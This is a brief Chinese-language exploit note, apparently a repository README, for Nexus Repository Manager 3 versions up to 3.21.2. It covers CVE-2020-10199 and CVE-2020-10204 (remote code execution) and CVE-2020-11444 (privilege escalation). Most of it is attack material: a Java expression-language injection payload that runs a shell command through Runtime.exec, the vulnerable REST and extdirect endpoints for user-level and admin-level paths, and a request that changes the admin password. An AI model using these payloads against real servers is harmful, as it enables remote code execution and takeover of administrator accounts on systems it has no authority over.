# Nexus Repository Manager 3 Vuln (影响版本：<= 3.21.2)

## CVE-2020-10199、CVE-2020-10204、CVE-2020-11444

## CVE-2020-10199 远程代码命令执行

## 回显poc

![](./CVE-2020-10199.gif)

## 不回显poc

`$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10199')}`

## 普通用户权限
```
/service/rest/beta/repositories/go/group
```

## 需要管理员权限

1. 创建CleanupPolicy

`/service/extdirect`

2. 创建repositories

`/service/rest/beta/repositories/apt/hosted`

# CVE-2020-10204 远程代码命令执行

1. 利用更新用户接口
`/service/extdirect`
2. 利用创建角色接口
`/service/extdirect`

# CVE-2020-11444 越权漏洞

## 调用更新role接口

```
/service/rest/beta/security/users/admin/change-password

POST:
123456
```


# 参考链接

https://www.cnblogs.com/magic-zero/p/12641068.html

https://github.com/threedr3am/learnjavabug/tree/93d57c428333f98b5927d02630737e639dcb226b/nexus

